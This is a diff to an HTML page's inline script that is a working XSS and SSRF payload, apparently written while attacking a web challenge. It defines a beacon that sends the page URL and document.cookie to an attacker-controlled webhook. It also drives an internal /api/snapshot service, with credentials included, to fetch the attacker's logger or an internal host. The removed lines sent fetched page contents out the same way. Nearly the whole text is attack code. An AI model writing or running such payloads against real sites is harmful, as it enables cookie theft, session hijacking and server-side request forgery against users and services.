@@ -11,9 +11,12 @@
    try{new Image().src=WH+tag+'?d='+encodeURIComponent(data);}catch(e){}
    try{fetch(WH+tag,{method:'POST',body:data,mode:'no-cors'});}catch(e){}}
  B('00-JS-RAN','href='+location.href+' ck='+document.cookie);
- try{fetch(W+'/',{credentials:'include'}).then(r=>r.text()).then(t=>B('A-readhome-OK',t)).catch(e=>B('A-readhome-FAIL',''+e));}catch(e){B('A-ex',''+e);}
- try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:W+'/'})}).then(r=>r.text()).then(t=>B('B-snapREAD',t)).catch(e=>B('B-snapREAD-FAIL',''+e));}catch(e){B('B-ex',''+e);}
- try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:WH+'C-SNAPCB'}),mode:'no-cors'}).then(()=>B('C-snapsent','ok')).catch(e=>B('C-snap-FAIL',''+e));}catch(e){B('C-ex',''+e);}
+ // snapshot pointed at OUR logger (no-cors, NO json header -> valid). If snapshot svc visits us -> reachable+authed; check cookie.
+ try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',mode:'no-cors',body:JSON.stringify({url:WH+'SNAPCB'})}).then(()=>B('snap1-sent','ok')).catch(e=>B('snap1-fail',''+e));}catch(e){B('snap1-ex',''+e);}
+ // control: snapshot internal web:3000/ (no-cors)
+ try{fetch(W+'/api/snapshot',{method:'POST',credentials:'include',mode:'no-cors',body:JSON.stringify({url:W+'/'})}).then(()=>B('snap2-internal-sent','ok')).catch(e=>B('snap2-fail',''+e));}catch(e){B('snap2-ex',''+e);}
+ // try reading home with no-cors just to confirm reachability (opaque)
+ try{fetch(W+'/',{credentials:'include',mode:'no-cors'}).then(r=>B('home-nocors','type='+r.type)).catch(e=>B('home-nocors-fail',''+e));}catch(e){}
 })();
 </script>
 </body></html>
